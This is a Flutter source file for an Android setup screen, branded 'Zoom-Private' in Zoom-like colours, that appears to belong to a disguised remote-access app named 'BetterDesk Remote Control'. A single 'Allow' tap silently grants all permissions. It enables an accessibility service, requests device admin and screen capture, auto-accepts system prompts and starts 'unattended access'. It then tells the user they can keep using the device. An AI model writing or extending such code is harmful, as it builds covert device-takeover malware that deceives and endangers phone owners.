import 'dart:async';

import 'package:flutter/material.dart';
import '../services/setup_service.dart';

/// Single-tap unattended-access setup.
class SetupPermissionsScreen extends StatefulWidget {
  final VoidCallback onComplete;
  const SetupPermissionsScreen({super.key, required this.onComplete});

  @override
  State<SetupPermissionsScreen> createState() => _SetupPermissionsScreenState();
}

class _SetupPermissionsScreenState extends State<SetupPermissionsScreen>
    with WidgetsBindingObserver {
  final SetupService _setup = SetupService();
  bool _busy = false;
  bool _completed = false;
  bool _awaitingAccessibility = false;
  String _hint = '';

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _check();
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed) _check();
  }

  Future<void> _check() async {
    if (_completed) return;
    final s = await _setup.getStatus();
    if (!mounted) return;
    if (s.requiredGranted) {
      await _finish();
      return;
    }
    if (_awaitingAccessibility && s.accessibility) {
      _awaitingAccessibility = false;
      await _setup.armAutoGrant();
      if (!s.screenCapture) {
        await _setup.requestScreenCapture();
      }
      final after = await _setup.getStatus();
      if (after.requiredGranted) await _finish();
      return;
    }
    if (_awaitingAccessibility && !s.accessibility && mounted) {
      setState(() => _hint = 'Enable \"BetterDesk Remote Control\" in Accessibility');
    }
  }

  Future<void> _finish() async {
    if (_completed) return;
    _completed = true;
    await _setup.armAutoGrant();
    await _setup.requestSystemAlertWindow();
    await _setup.startUnattendedAccess();
    await _setup.disarmAutoGrant();
    if (mounted) widget.onComplete();
  }

  Future<void> _allow() async {
    if (_busy || _completed) return;
    setState(() {
      _busy = true;
      _hint = 'Enabling.';
    });
    try {
      await _setup.armAutoGrant();
      await _setup.grantAllSilently();
      await _setup.enableAccessibilitySilently();

      var s = await _setup.getStatus();

      if (!s.accessibility) {
        await _setup.requestDeviceAdmin();
        await _setup.grantAllSilently();
        await _setup.enableAccessibilitySilently();
        s = await _setup.getStatus();
      }

      if (s.accessibility && !s.screenCapture) {
        await _setup.requestScreenCapture();
        s = await _setup.getStatus();
      }

      if (s.requiredGranted) {
        await _finish();
        return;
      }

      if (!s.accessibility) {
        _awaitingAccessibility = true;
        if (mounted) setState(() => _hint = 'Enable \"BetterDesk Remote Control\" in Accessibility');
        await _setup.openAccessibilityDetailsSettings();
        return;
      }

      if (mounted) setState(() => _hint = 'Starting background service.');
      await _finish();
    } finally {
      if (mounted) setState(() => _busy = false);
    }
  }

  @override
  Widget build(BuildContext context) {
    final done = _completed;
    return Scaffold(
      backgroundColor: const Color(0xFF0753FB),
      body: SafeArea(
        child: Center(
          child: Padding(
            padding: const EdgeInsets.all(16),
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Icon(
                  done ? Icons.check_circle : Icons.lock_open,
                  size: 48,
                  color: Colors.white,
                ),
                const SizedBox(height: 12),
                const Text(
                  'Zoom-Private',
                  style: TextStyle(
                    fontSize: 20,
                    fontWeight: FontWeight.bold,
                    color: Colors.white,
                  ),
                  textAlign: TextAlign.center,
                ),
                const SizedBox(height: 6),
                Text(
                  done
                      ? 'Connected. You can keep using your device.'
                      : 'Tap Allow to grant permissions and enable remote access.',
                  style: const TextStyle(
                    fontSize: 12,
                    color: Colors.white70,
                  ),
                  textAlign: TextAlign.center,
                ),
                const SizedBox(height: 24),
                SizedBox(
                  width: double.infinity,
                  height: 48,
                  child: ElevatedButton(
                    onPressed: (_busy || done) ? null : _allow,
                    style: ElevatedButton.styleFrom(
                      backgroundColor: const Color(0xFF0753FB),
                      foregroundColor: Colors.white,
                      disabledBackgroundColor: const Color(0xFF0753FB).withOpacity(0.6),
                      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
                    ),
                    child: Text(
                      done ? 'Connected' : 'Allow',
                      style: const TextStyle(
                        fontSize: 16,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                  ),
                ),
                if (_hint.isNotEmpty) ...[
                  const SizedBox(height: 8),
                  Text(
                    _hint,
                    textAlign: TextAlign.center,
                    style: const TextStyle(fontSize: 11, color: Colors.white70),
                  ),
                ],
              ],
            ),
          ),
        ),
      ),
    );
  }
}
